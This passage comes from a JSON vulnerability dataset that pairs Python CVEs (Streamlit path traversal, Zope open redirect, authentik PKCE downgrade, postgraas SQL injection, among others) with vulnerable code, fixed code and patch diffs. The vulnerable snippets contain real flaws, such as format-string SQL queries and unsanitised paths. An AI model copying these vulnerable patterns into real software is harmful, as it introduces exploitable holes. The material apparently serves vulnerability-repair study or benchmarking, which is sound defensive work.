        "snippet": "def download(url, module_name, md5sum, save_name=None):\n    dirname = os.path.join(DATA_HOME, module_name)\n    if not os.path.exists(dirname):\n        os.makedirs(dirname)\n\n    filename = os.path.join(\n        dirname, url.split('/')[-1] if save_name is None else save_name\n    )\n\n    if os.path.exists(filename) and md5file(filename) == md5sum:\n        return filename\n\n    retry = 0\n    retry_limit = 3\n    while not (os.path.exists(filename) and md5file(filename) == md5sum):\n        if os.path.exists(filename):\n            sys.stderr.write(f\"file {md5file(filename)}  md5 {md5sum}\\n\")\n        if retry < retry_limit:\n            retry += 1\n        else:\n            raise RuntimeError(\n                f\"Cannot download {url} within retry limit {retry_limit}\"\n            )\n        sys.stderr.write(\n            f\"Cache file {filename} not found, downloading {url} \\n\"\n        )\n        sys.stderr.write(\"Begin to download\\n\")\n        try:\n            # (risemeup1):use httpx to replace requests\n            with httpx.stream(\n                \"GET\", url, timeout=None, follow_redirects=True\n            ) as r:\n                total_length = r.headers.get('content-length')\n                if total_length is None:\n                    with open(filename, 'wb') as f:\n                        shutil.copyfileobj(r.raw, f)\n                else:\n                    with open(filename, 'wb') as f:\n                        chunk_size = 4096\n                        total_length = int(total_length)\n                        total_iter = total_length / chunk_size + 1\n                        log_interval = (\n                            total_iter // 20 if total_iter > 20 else 1\n                        )\n                        log_index = 0\n                        bar = paddle.hapi.progressbar.ProgressBar(\n                            total_iter, name='item'\n                        )\n                        for data in r.iter_bytes(chunk_size=chunk_size):\n                            f.write(data)\n                            log_index += 1\n                            bar.update(log_index, {})\n                            if log_index % log_interval == 0:\n                                bar.update(log_index)\n\n        except Exception as e:\n            # re-try\n            continue\n    sys.stderr.write(\"\\nDownload finished\\n\")\n    sys.stdout.flush()\n    return filename"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_110_1",
        "commit": "5c50d1a",
        "file_path": "python/paddle/dataset/common.py",
        "start_line": 74,
        "end_line": 139,
        "snippet": "def download(url, module_name, md5sum, save_name=None):\n    module_name = re.match(\"^[a-zA-Z0-9_/\\\\-]+$\", module_name).group()\n    if isinstance(save_name, str):\n        save_name = re.match(\n            \"^(?:(?!\\\\.\\\\.)[a-zA-Z0-9_/\\\\.-])+$\", save_name\n        ).group()\n    dirname = os.path.join(DATA_HOME, module_name)\n    if not os.path.exists(dirname):\n        os.makedirs(dirname)\n\n    filename = os.path.join(\n        dirname, url.split('/')[-1] if save_name is None else save_name\n    )\n\n    if os.path.exists(filename) and md5file(filename) == md5sum:\n        return filename\n\n    retry = 0\n    retry_limit = 3\n    while not (os.path.exists(filename) and md5file(filename) == md5sum):\n        if os.path.exists(filename):\n            sys.stderr.write(f\"file {md5file(filename)}  md5 {md5sum}\\n\")\n        if retry < retry_limit:\n            retry += 1\n        else:\n            raise RuntimeError(\n                f\"Cannot download {url} within retry limit {retry_limit}\"\n            )\n        sys.stderr.write(\n            f\"Cache file {filename} not found, downloading {url} \\n\"\n        )\n        sys.stderr.write(\"Begin to download\\n\")\n        try:\n            # (risemeup1):use httpx to replace requests\n            with httpx.stream(\n                \"GET\", url, timeout=None, follow_redirects=True\n            ) as r:\n                total_length = r.headers.get('content-length')\n                if total_length is None:\n                    with open(filename, 'wb') as f:\n                        shutil.copyfileobj(r.raw, f)\n                else:\n                    with open(filename, 'wb') as f:\n                        chunk_size = 4096\n                        total_length = int(total_length)\n                        total_iter = total_length / chunk_size + 1\n                        log_interval = (\n                            total_iter // 20 if total_iter > 20 else 1\n                        )\n                        log_index = 0\n                        bar = paddle.hapi.progressbar.ProgressBar(\n                            total_iter, name='item'\n                        )\n                        for data in r.iter_bytes(chunk_size=chunk_size):\n                            f.write(data)\n                            log_index += 1\n                            bar.update(log_index, {})\n                            if log_index % log_interval == 0:\n                                bar.update(log_index)\n\n        except Exception as e:\n            # re-try\n            continue\n    sys.stderr.write(\"\\nDownload finished\\n\")\n    sys.stdout.flush()\n    return filename"
      }
    ],
    "vul_patch": "--- a/python/paddle/dataset/common.py\n+++ b/python/paddle/dataset/common.py\n@@ -1,4 +1,9 @@\n def download(url, module_name, md5sum, save_name=None):\n+    module_name = re.match(\"^[a-zA-Z0-9_/\\\\-]+$\", module_name).group()\n+    if isinstance(save_name, str):\n+        save_name = re.match(\n+            \"^(?:(?!\\\\.\\\\.)[a-zA-Z0-9_/\\\\.-])+$\", save_name\n+        ).group()\n     dirname = os.path.join(DATA_HOME, module_name)\n     if not os.path.exists(dirname):\n         os.makedirs(dirname)\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2024-42474",
    "cve_description": "Streamlit is a data oriented application development framework for python. Snowflake Streamlit open source addressed a security vulnerability via the static file sharing feature. Users of hosted Streamlit app(s) on Windows were vulnerable to a path traversal vulnerability when the static file sharing feature is enabled. An attacker could utilize the vulnerability to leak the password hash of the Windows user running Streamlit. The vulnerability was patched on Jul 25, 2024, as part of Streamlit open source version 1.37.0. The vulnerability only affects Windows.",
    "cwe_info": {
      "CWE-73": {
        "name": "External Control of File Name or Path",
        "description": "The product allows user input to control or influence paths or file names that are used in filesystem operations."
      },
      "CWE-22": {
        "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')",
        "description": "The product uses external input to construct a pathname that is intended to identify a file or directory that is located underneath a restricted parent directory, but the product does not properly neutralize special elements within the pathname that can cause the pathname to resolve to a location that is outside of the restricted directory."
      }
    },
    "repo": "https://github.com/streamlit/streamlit",
    "patch_url": [
      "https://github.com/streamlit/streamlit/commit/3a639859cfdfba2187c81897d44a3e33825eb0a3"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_141_1",
        "commit": "40303e1",
        "file_path": "lib/streamlit/web/server/app_static_file_handler.py",
        "start_line": 37,
        "end_line": 67,
        "snippet": "class AppStaticFileHandler(tornado.web.StaticFileHandler):\n    def initialize(self, path: str, default_filename: str | None = None) -> None:\n        super().initialize(path, default_filename)\n        mimetypes.add_type(\"image/webp\", \".webp\")\n\n    def validate_absolute_path(self, root: str, absolute_path: str) -> str | None:\n        full_path = os.path.realpath(absolute_path)\n\n        if os.path.isdir(full_path):\n            # we don't want to serve directories, and serve only files\n            raise tornado.web.HTTPError(404)\n\n        if os.path.commonpath([full_path, root]) != root:\n            # Don't allow misbehaving clients to break out of the static files directory\n            _LOGGER.warning(\n                \"Serving files outside of the static directory is not supported\"\n            )\n            raise tornado.web.HTTPError(404)\n\n        if (\n            os.path.exists(full_path)\n            and os.path.getsize(full_path) > MAX_APP_STATIC_FILE_SIZE\n        ):\n            raise tornado.web.HTTPError(\n                404,\n                \"File is too large, its size should not exceed \"\n                f\"{MAX_APP_STATIC_FILE_SIZE} bytes\",\n                reason=\"File is too large\",\n            )\n\n        return super().validate_absolute_path(root, absolute_path)"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_141_1",
        "commit": "3a63985",
        "file_path": "lib/streamlit/web/server/app_static_file_handler.py",
        "start_line": 37,
        "end_line": 69,
        "snippet": "class AppStaticFileHandler(tornado.web.StaticFileHandler):\n    def initialize(self, path: str, default_filename: str | None = None) -> None:\n        super().initialize(path, default_filename)\n        mimetypes.add_type(\"image/webp\", \".webp\")\n\n    def validate_absolute_path(self, root: str, absolute_path: str) -> str | None:\n        full_path = os.path.realpath(absolute_path)\n\n        ret_val = super().validate_absolute_path(root, absolute_path)\n\n        if os.path.isdir(full_path):\n            # we don't want to serve directories, and serve only files\n            raise tornado.web.HTTPError(404)\n\n        if os.path.commonpath([full_path, root]) != root:\n            # Don't allow misbehaving clients to break out of the static files directory\n            _LOGGER.warning(\n                \"Serving files outside of the static directory is not supported\"\n            )\n            raise tornado.web.HTTPError(404)\n\n        if (\n            os.path.exists(full_path)\n            and os.path.getsize(full_path) > MAX_APP_STATIC_FILE_SIZE\n        ):\n            raise tornado.web.HTTPError(\n                404,\n                \"File is too large, its size should not exceed \"\n                f\"{MAX_APP_STATIC_FILE_SIZE} bytes\",\n                reason=\"File is too large\",\n            )\n\n        return ret_val"
      }
    ],
    "vul_patch": "--- a/lib/streamlit/web/server/app_static_file_handler.py\n+++ b/lib/streamlit/web/server/app_static_file_handler.py\n@@ -5,6 +5,8 @@\n \n     def validate_absolute_path(self, root: str, absolute_path: str) -> str | None:\n         full_path = os.path.realpath(absolute_path)\n+\n+        ret_val = super().validate_absolute_path(root, absolute_path)\n \n         if os.path.isdir(full_path):\n             # we don't want to serve directories, and serve only files\n@@ -28,4 +30,4 @@\n                 reason=\"File is too large\",\n             )\n \n-        return super().validate_absolute_path(root, absolute_path)\n+        return ret_val\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2021-21337",
    "cve_description": "Products.PluggableAuthService is a pluggable Zope authentication and authorization framework. In Products.PluggableAuthService before version 2.6.0 there is an open redirect vulnerability. A maliciously crafted link to the login form and login functionality could redirect the browser to a different website. The problem has been fixed in version 2.6.1. Depending on how you have installed Products.PluggableAuthService, you should change the buildout version pin to `2.6.1` and re-run the buildout, or if you used `pip` simply do `pip install \"Products.PluggableAuthService>=2.6.1\".",
    "cwe_info": {
      "CWE-601": {
        "name": "URL Redirection to Untrusted Site ('Open Redirect')",
        "description": "The web application accepts a user-controlled input that specifies a link to an external site, and uses that link in a redirect."
      }
    },
    "repo": "https://github.com/zopefoundation/Products.PluggableAuthService",
    "patch_url": [
      "https://github.com/zopefoundation/Products.PluggableAuthService/commit/7eead067898852ebd3e0f143bc51295928528dfa"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_368_1",
        "commit": "c49ddb0f2770cab57f76475f4571e8e842181b87",
        "file_path": "src/Products/PluggableAuthService/plugins/CookieAuthHelper.py",
        "start_line": 194,
        "end_line": 239,
        "snippet": "    def unauthorized(self):\n        req = self.REQUEST\n        resp = req['RESPONSE']\n\n        # If we set the auth cookie before, delete it now.\n        if self.cookie_name in resp.cookies:\n            del resp.cookies[self.cookie_name]\n\n        # Redirect if desired.\n        url = self.getLoginURL()\n        if url is not None:\n            came_from = req.get('came_from', None)\n\n            if came_from is None:\n                came_from = req.get('ACTUAL_URL', '')\n                query = req.get('QUERY_STRING')\n                if query:\n                    if not query.startswith('?'):\n                        query = '?' + query\n                    came_from = came_from + query\n            else:\n                # If came_from contains a value it means the user\n                # must be coming through here a second time\n                # Reasons could be typos when providing credentials\n                # or a redirect loop (see below)\n                req_url = req.get('ACTUAL_URL', '')\n\n                if req_url and req_url == url:\n                    # Oops... The login_form cannot be reached by the user -\n                    # it might be protected itself due to misconfiguration -\n                    # the only sane thing to do is to give up because we are\n                    # in an endless redirect loop.\n                    return 0\n\n            if '?' in url:\n                sep = '&'\n            else:\n                sep = '?'\n            url = '%s%scame_from=%s' % (url, sep, quote(came_from))\n            resp.redirect(url, lock=1)\n            resp.setHeader('Expires', 'Sat, 01 Jan 2000 00:00:00 GMT')\n            resp.setHeader('Cache-Control', 'no-cache')\n            return 1\n\n        # Could not challenge.\n        return 0"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_368_1",
        "commit": "7eead067898852ebd3e0f143bc51295928528dfa",
        "file_path": "src/Products/PluggableAuthService/plugins/CookieAuthHelper.py",
        "start_line": 196,
        "end_line": 247,
        "snippet": "    def unauthorized(self):\n        req = self.REQUEST\n        resp = req['RESPONSE']\n\n        # If we set the auth cookie before, delete it now.\n        if self.cookie_name in resp.cookies:\n            del resp.cookies[self.cookie_name]\n\n        # Redirect if desired.\n        url = self.getLoginURL()\n        if url is not None:\n            came_from = req.get('came_from', None)\n\n            if came_from is None:\n                came_from = req.get('ACTUAL_URL', '')\n                query = req.get('QUERY_STRING')\n                if query:\n                    if not query.startswith('?'):\n                        query = '?' + query\n                    came_from = came_from + query\n            else:\n                # If came_from contains a value it means the user\n                # must be coming through here a second time\n                # Reasons could be typos when providing credentials\n                # or a redirect loop (see below)\n                req_url = req.get('ACTUAL_URL', '')\n\n                if req_url and req_url == url:\n                    # Oops... The login_form cannot be reached by the user -\n                    # it might be protected itself due to misconfiguration -\n                    # the only sane thing to do is to give up because we are\n                    # in an endless redirect loop.\n                    return 0\n\n            # Sanitize the return URL ``came_from`` and only allow local URLs\n            # to prevent an open exploitable redirect issue\n            if came_from:\n                parsed = urlparse(came_from)\n                came_from = urlunparse(('', '') + parsed[2:])\n\n            if '?' in url:\n                sep = '&'\n            else:\n                sep = '?'\n            url = '%s%scame_from=%s' % (url, sep, quote(came_from))\n            resp.redirect(url, lock=1)\n            resp.setHeader('Expires', 'Sat, 01 Jan 2000 00:00:00 GMT')\n            resp.setHeader('Cache-Control', 'no-cache')\n            return 1\n\n        # Could not challenge.\n        return 0"
      }
    ],
    "vul_patch": "--- a/src/Products/PluggableAuthService/plugins/CookieAuthHelper.py\n+++ b/src/Products/PluggableAuthService/plugins/CookieAuthHelper.py\n@@ -32,6 +32,12 @@\n                     # in an endless redirect loop.\n                     return 0\n \n+            # Sanitize the return URL ``came_from`` and only allow local URLs\n+            # to prevent an open exploitable redirect issue\n+            if came_from:\n+                parsed = urlparse(came_from)\n+                came_from = urlunparse(('', '') + parsed[2:])\n+\n             if '?' in url:\n                 sep = '&'\n             else:\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2024-23647",
    "cve_description": "Authentik is an open-source Identity Provider. There is a bug in our implementation of PKCE that allows an attacker to circumvent the protection that PKCE offers. PKCE adds the code_challenge parameter to the authorization request and adds the code_verifier parameter to the token request. Prior to 2023.8.7 and 2023.10.7, a downgrade scenario is possible: if the attacker removes the code_challenge parameter from the authorization request, authentik will not do the PKCE check. Because of this bug, an attacker can circumvent the protection PKCE offers, such as CSRF attacks and code injection attacks.  Versions 2023.8.7 and 2023.10.7 fix the issue.",
    "cwe_info": {
      "CWE-287": {
        "name": "Improper Authentication",
        "description": "When an actor claims to have a given identity, the product does not prove or insufficiently proves that the claim is correct."
      }
    },
    "repo": "https://github.com/goauthentik/authentik",
    "patch_url": [
      "https://github.com/goauthentik/authentik/commit/38e04ae12720e5d81b4f7ac77997eb8d1275d31a"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_289_1",
        "commit": "dca8c83",
        "file_path": "authentik/providers/oauth2/views/token.py",
        "start_line": 173,
        "end_line": 247,
        "snippet": "    def __post_init_code(self, raw_code: str, request: HttpRequest):\n        if not raw_code:\n            LOGGER.warning(\"Missing authorization code\")\n            raise TokenError(\"invalid_grant\")\n\n        allowed_redirect_urls = self.provider.redirect_uris.split()\n        # At this point, no provider should have a blank redirect_uri, in case they do\n        # this will check an empty array and raise an error\n        try:\n            if not any(fullmatch(x, self.redirect_uri) for x in allowed_redirect_urls):\n                LOGGER.warning(\n                    \"Invalid redirect uri (regex comparison)\",\n                    redirect_uri=self.redirect_uri,\n                    expected=allowed_redirect_urls,\n                )\n                Event.new(\n                    EventAction.CONFIGURATION_ERROR,\n                    message=\"Invalid redirect URI used by provider\",\n                    provider=self.provider,\n                    redirect_uri=self.redirect_uri,\n                    expected=allowed_redirect_urls,\n                ).from_http(request)\n                raise TokenError(\"invalid_client\")\n        except RegexError as exc:\n            LOGGER.info(\"Failed to parse regular expression, checking directly\", exc=exc)\n            if not any(x == self.redirect_uri for x in allowed_redirect_urls):\n                LOGGER.warning(\n                    \"Invalid redirect uri (strict comparison)\",\n                    redirect_uri=self.redirect_uri,\n                    expected=allowed_redirect_urls,\n                )\n                Event.new(\n                    EventAction.CONFIGURATION_ERROR,\n                    message=\"Invalid redirect_uri configured\",\n                    provider=self.provider,\n                ).from_http(request)\n                raise TokenError(\"invalid_client\")\n\n        # Check against forbidden schemes\n        if urlparse(self.redirect_uri).scheme in FORBIDDEN_URI_SCHEMES:\n            raise TokenError(\"invalid_request\")\n\n        self.authorization_code = AuthorizationCode.objects.filter(code=raw_code).first()\n        if not self.authorization_code:\n            LOGGER.warning(\"Code does not exist\", code=raw_code)\n            raise TokenError(\"invalid_grant\")\n\n        if self.authorization_code.is_expired:\n            LOGGER.warning(\n                \"Code is expired\",\n                token=raw_code,\n            )\n            raise TokenError(\"invalid_grant\")\n\n        if self.authorization_code.provider != self.provider or self.authorization_code.is_expired:\n            LOGGER.warning(\"Invalid code: invalid client or code has expired\")\n            raise TokenError(\"invalid_grant\")\n\n        # Validate PKCE parameters.\n        if self.authorization_code.code_challenge:\n            # Authorization code had PKCE but we didn't get one\n            if not self.code_verifier:\n                raise TokenError(\"invalid_request\")\n            if self.authorization_code.code_challenge_method == PKCE_METHOD_S256:\n                new_code_challenge = (\n                    urlsafe_b64encode(sha256(self.code_verifier.encode(\"ascii\")).digest())\n                    .decode(\"utf-8\")\n                    .replace(\"=\", \"\")\n                )\n            else:\n                new_code_challenge = self.code_verifier\n\n            if new_code_challenge != self.authorization_code.code_challenge:\n                LOGGER.warning(\"Code challenge not matching\")\n                raise TokenError(\"invalid_grant\")"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_289_1",
        "commit": "38e04ae12720e5d81b4f7ac77997eb8d1275d31a",
        "file_path": "authentik/providers/oauth2/views/token.py",
        "start_line": 173,
        "end_line": 251,
        "snippet": "    def __post_init_code(self, raw_code: str, request: HttpRequest):\n        if not raw_code:\n            LOGGER.warning(\"Missing authorization code\")\n            raise TokenError(\"invalid_grant\")\n\n        allowed_redirect_urls = self.provider.redirect_uris.split()\n        # At this point, no provider should have a blank redirect_uri, in case they do\n        # this will check an empty array and raise an error\n        try:\n            if not any(fullmatch(x, self.redirect_uri) for x in allowed_redirect_urls):\n                LOGGER.warning(\n                    \"Invalid redirect uri (regex comparison)\",\n                    redirect_uri=self.redirect_uri,\n                    expected=allowed_redirect_urls,\n                )\n                Event.new(\n                    EventAction.CONFIGURATION_ERROR,\n                    message=\"Invalid redirect URI used by provider\",\n                    provider=self.provider,\n                    redirect_uri=self.redirect_uri,\n                    expected=allowed_redirect_urls,\n                ).from_http(request)\n                raise TokenError(\"invalid_client\")\n        except RegexError as exc:\n            LOGGER.info(\"Failed to parse regular expression, checking directly\", exc=exc)\n            if not any(x == self.redirect_uri for x in allowed_redirect_urls):\n                LOGGER.warning(\n                    \"Invalid redirect uri (strict comparison)\",\n                    redirect_uri=self.redirect_uri,\n                    expected=allowed_redirect_urls,\n                )\n                Event.new(\n                    EventAction.CONFIGURATION_ERROR,\n                    message=\"Invalid redirect_uri configured\",\n                    provider=self.provider,\n                ).from_http(request)\n                raise TokenError(\"invalid_client\")\n\n        # Check against forbidden schemes\n        if urlparse(self.redirect_uri).scheme in FORBIDDEN_URI_SCHEMES:\n            raise TokenError(\"invalid_request\")\n\n        self.authorization_code = AuthorizationCode.objects.filter(code=raw_code).first()\n        if not self.authorization_code:\n            LOGGER.warning(\"Code does not exist\", code=raw_code)\n            raise TokenError(\"invalid_grant\")\n\n        if self.authorization_code.is_expired:\n            LOGGER.warning(\n                \"Code is expired\",\n                token=raw_code,\n            )\n            raise TokenError(\"invalid_grant\")\n\n        if self.authorization_code.provider != self.provider or self.authorization_code.is_expired:\n            LOGGER.warning(\"Invalid code: invalid client or code has expired\")\n            raise TokenError(\"invalid_grant\")\n\n        # Validate PKCE parameters.\n        if self.authorization_code.code_challenge:\n            # Authorization code had PKCE but we didn't get one\n            if not self.code_verifier:\n                raise TokenError(\"invalid_grant\")\n            if self.authorization_code.code_challenge_method == PKCE_METHOD_S256:\n                new_code_challenge = (\n                    urlsafe_b64encode(sha256(self.code_verifier.encode(\"ascii\")).digest())\n                    .decode(\"utf-8\")\n                    .replace(\"=\", \"\")\n                )\n            else:\n                new_code_challenge = self.code_verifier\n\n            if new_code_challenge != self.authorization_code.code_challenge:\n                LOGGER.warning(\"Code challenge not matching\")\n                raise TokenError(\"invalid_grant\")\n        # Token request had a code_verifier but code did not have a code challenge\n        # Prevent downgrade\n        if not self.authorization_code.code_challenge and self.code_verifier:\n            raise TokenError(\"invalid_grant\")"
      }
    ],
    "vul_patch": "--- a/authentik/providers/oauth2/views/token.py\n+++ b/authentik/providers/oauth2/views/token.py\n@@ -60,7 +60,7 @@\n         if self.authorization_code.code_challenge:\n             # Authorization code had PKCE but we didn't get one\n             if not self.code_verifier:\n-                raise TokenError(\"invalid_request\")\n+                raise TokenError(\"invalid_grant\")\n             if self.authorization_code.code_challenge_method == PKCE_METHOD_S256:\n                 new_code_challenge = (\n                     urlsafe_b64encode(sha256(self.code_verifier.encode(\"ascii\")).digest())\n@@ -73,3 +73,7 @@\n             if new_code_challenge != self.authorization_code.code_challenge:\n                 LOGGER.warning(\"Code challenge not matching\")\n                 raise TokenError(\"invalid_grant\")\n+        # Token request had a code_verifier but code did not have a code challenge\n+        # Prevent downgrade\n+        if not self.authorization_code.code_challenge and self.code_verifier:\n+            raise TokenError(\"invalid_grant\")\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2018-25088",
    "cve_description": "A vulnerability, which was classified as critical, was found in Blue Yonder postgraas_server up to 2.0.0b2. Affected is the function _create_pg_connection/create_postgres_db of the file postgraas_server/backends/postgres_cluster/postgres_cluster_driver.py of the component PostgreSQL Backend Handler. The manipulation leads to sql injection. Upgrading to version 2.0.0 is able to address this issue. The patch is identified as 7cd8d016edc74a78af0d81c948bfafbcc93c937c. It is recommended to upgrade the affected component. VDB-234246 is the identifier assigned to this vulnerability.",
    "cwe_info": {
      "CWE-89": {
        "name": "Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')",
        "description": "The product constructs all or part of an SQL command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended SQL command when it is sent to a downstream component. Without sufficient removal or quoting of SQL syntax in user-controllable inputs, the generated SQL query can cause those inputs to be interpreted as SQL instead of ordinary user data."
      }
    },
    "repo": "https://github.com/blue-yonder/postgraas_server",
    "patch_url": [
      "https://github.com/blue-yonder/postgraas_server/commit/7cd8d016edc74a78af0d81c948bfafbcc93c937c"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_232_1",
        "commit": "bd4f1b8",
        "file_path": "postgraas_server/backends/postgres_cluster/postgres_cluster_driver.py",
        "start_line": 19,
        "end_line": 27,
        "snippet": "def check_db_or_user_exists(db_name, db_user, config):\n    with _create_pg_connection(config) as con:\n        with con.cursor() as cur:\n            cur.execute(\"SELECT 1 FROM pg_database WHERE datname='{}';\".format(db_name))\n            db_exists = cur.fetchone() is not None\n            cur.execute(\"SELECT 1 FROM pg_roles WHERE rolname='{}';\".format(db_user))\n            user = cur.fetchone()\n            user_exists = user is not None\n            return db_exists or user_exists"
      },
      {
        "id": "vul_py_232_2",
        "commit": "bd4f1b8",
        "file_path": "postgraas_server/backends/postgres_cluster/postgres_cluster_driver.py",
        "start_line": 30,
        "end_line": 53,
        "snippet": "def create_postgres_db(connection_dict, config):\n    if check_db_or_user_exists(connection_dict[\"db_name\"], connection_dict[\"db_username\"], config):\n        raise ValueError(\"db or user already exists\")\n    with _create_pg_connection(config) as con:\n        con.set_isolation_level(ISOLATION_LEVEL_AUTOCOMMIT)\n        with con.cursor() as cur:\n            create_role = \"CREATE USER {db_username} WITH PASSWORD '{db_pwd}';\".format(**connection_dict)\n            drop_role = \"DROP ROLE {db_username};\".format(**connection_dict)\n            grant_role = 'GRANT {db_username} TO \"{postgraas_user}\";'.format(\n                db_username=connection_dict['db_username'], postgraas_user=get_normalized_username(config['username'])\n            )\n            create_database = \"CREATE DATABASE {db_name} OWNER {db_username};\".format(**connection_dict)\n            try:\n                cur.execute(create_role)\n                cur.execute(grant_role)\n            except psycopg2.ProgrammingError as e:\n                raise ValueError(e.args[0])\n            # cleanup role in case database creation fails\n            # saidly 'CREATE DATABASE' cannot run inside a transaction block\n            try:\n                cur.execute(create_database)\n            except psycopg2.ProgrammingError as e:\n                cur.execute(drop_role)\n                raise ValueError(e.args[0])"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_232_1",
        "commit": "7cd8d01",
        "file_path": "postgraas_server/backends/postgres_cluster/postgres_cluster_driver.py",
        "start_line": 20,
        "end_line": 28,
        "snippet": "def check_db_or_user_exists(db_name, db_user, config):\n    with _create_pg_connection(config) as con:\n        with con.cursor() as cur:\n            cur.execute(\"SELECT 1 FROM pg_database WHERE datname=%s;\", (db_name, ))\n            db_exists = cur.fetchone() is not None\n            cur.execute(\"SELECT 1 FROM pg_roles WHERE rolname=%s;\", (db_user, ))\n            user = cur.fetchone()\n            user_exists = user is not None\n            return db_exists or user_exists"
      },
      {
        "id": "fix_py_232_2",
        "commit": "7cd8d01",
        "file_path": "postgraas_server/backends/postgres_cluster/postgres_cluster_driver.py",
        "start_line": 31,
        "end_line": 60,
        "snippet": "def create_postgres_db(connection_dict, config):\n    if check_db_or_user_exists(connection_dict[\"db_name\"], connection_dict[\"db_username\"], config):\n        raise ValueError(\"db or user already exists\")\n    with _create_pg_connection(config) as con:\n        con.set_isolation_level(ISOLATION_LEVEL_AUTOCOMMIT)\n        with con.cursor() as cur:\n            try:\n                cur.execute(SQL(\"CREATE USER {} WITH PASSWORD %s;\").format(\n                    Identifier(connection_dict['db_username']),\n                ), (\n                    connection_dict['db_pwd'],\n                ))\n                cur.execute(SQL(\"GRANT {} TO {};\").format(\n                    Identifier(connection_dict['db_username']),\n                    Identifier(get_normalized_username(config['username'])),\n                ))\n            except psycopg2.ProgrammingError as e:\n                raise ValueError(e.args[0])\n            # cleanup role in case database creation fails\n            # sadly 'CREATE DATABASE' cannot run inside a transaction block\n            try:\n                cur.execute(SQL(\"CREATE DATABASE {} OWNER {};\").format(\n                    Identifier(connection_dict['db_name']),\n                    Identifier(connection_dict['db_username']),\n                ))\n            except psycopg2.ProgrammingError as e:\n                cur.execute(SQL(\"DROP ROLE {};\").format(\n                    Identifier(connection_dict['db_username']),\n                ))\n                raise ValueError(e.args[0])"
      }
    ],
    "vul_patch": "--- a/postgraas_server/backends/postgres_cluster/postgres_cluster_driver.py\n+++ b/postgraas_server/backends/postgres_cluster/postgres_cluster_driver.py\n@@ -1,9 +1,9 @@\n def check_db_or_user_exists(db_name, db_user, config):\n     with _create_pg_connection(config) as con:\n         with con.cursor() as cur:\n-            cur.execute(\"SELECT 1 FROM pg_database WHERE datname='{}';\".format(db_name))\n+            cur.execute(\"SELECT 1 FROM pg_database WHERE datname=%s;\", (db_name, ))\n             db_exists = cur.fetchone() is not None\n-            cur.execute(\"SELECT 1 FROM pg_roles WHERE rolname='{}';\".format(db_user))\n+            cur.execute(\"SELECT 1 FROM pg_roles WHERE rolname=%s;\", (db_user, ))\n             user = cur.fetchone()\n             user_exists = user is not None\n             return db_exists or user_exists\n\n--- a/postgraas_server/backends/postgres_cluster/postgres_cluster_driver.py\n+++ b/postgraas_server/backends/postgres_cluster/postgres_cluster_driver.py\n@@ -4,21 +4,27 @@\n     with _create_pg_connection(config) as con:\n         con.set_isolation_level(ISOLATION_LEVEL_AUTOCOMMIT)\n         with con.cursor() as cur:\n-            create_role = \"CREATE USER {db_username} WITH PASSWORD '{db_pwd}';\".format(**connection_dict)\n-            drop_role = \"DROP ROLE {db_username};\".format(**connection_dict)\n-            grant_role = 'GRANT {db_username} TO \"{postgraas_user}\";'.format(\n-                db_username=connection_dict['db_username'], postgraas_user=get_normalized_username(config['username'])\n-            )\n-            create_database = \"CREATE DATABASE {db_name} OWNER {db_username};\".format(**connection_dict)\n             try:\n-                cur.execute(create_role)\n-                cur.execute(grant_role)\n+                cur.execute(SQL(\"CREATE USER {} WITH PASSWORD %s;\").format(\n+                    Identifier(connection_dict['db_username']),\n+                ), (\n+                    connection_dict['db_pwd'],\n+                ))\n+                cur.execute(SQL(\"GRANT {} TO {};\").format(\n+                    Identifier(connection_dict['db_username']),\n+                    Identifier(get_normalized_username(config['username'])),\n+                ))\n             except psycopg2.ProgrammingError as e:\n                 raise ValueError(e.args[0])\n             # cleanup role in case database creation fails\n-            # saidly 'CREATE DATABASE' cannot run inside a transaction block\n+            # sadly 'CREATE DATABASE' cannot run inside a transaction block\n             try:\n-                cur.execute(create_database)\n+                cur.execute(SQL(\"CREATE DATABASE {} OWNER {};\").format(\n+                    Identifier(connection_dict['db_name']),\n+                    Identifier(connection_dict['db_username']),\n+                ))\n             except psycopg2.ProgrammingError as e:\n-                cur.execute(drop_role)\n+                cur.execute(SQL(\"DROP ROLE {};\").format(\n+                    Identifier(connection_dict['db_username']),\n+                ))\n                 raise ValueError(e.args[0])\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2021-23727",
    "cve_description": "This affects the package celery before 5.2.2. It by default trusts the messages and metadata stored in backends (result stores). When reading task metadata from the backend, the data is deserialized. Given that an attacker can gain access to, or somehow manipulate the metadata within a celery backend, they could trigger a stored command injection vulnerability and potentially gain further access to the system.",
    "cwe_info": {
      "CWE-94": {
        "name": "Improper Control of Generation of Code ('Code Injection')",
        "description": "The product constructs all or part of a code segment using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the syntax or behavior of the intended code segment."
      },
      "CWE-77": {
        "name": "Improper Neutralization of Special Elements used in a Command ('Command Injection')",
        "description": "The product constructs all or part of a command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended command when it is sent to a downstream component."
      },
      "CWE-78": {
        "name": "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')",
        "description": "The product constructs all or part of an OS command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended OS command when it is sent to a downstream component."
      }
    },
    "repo": "https://github.com/celery/celery",
    "patch_url": [
      "https://github.com/celery/celery/commit/1f7ad7e6df1e02039b6ab9eec617d283598cad6b"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_41_1",
        "commit": "2d8dbc2",
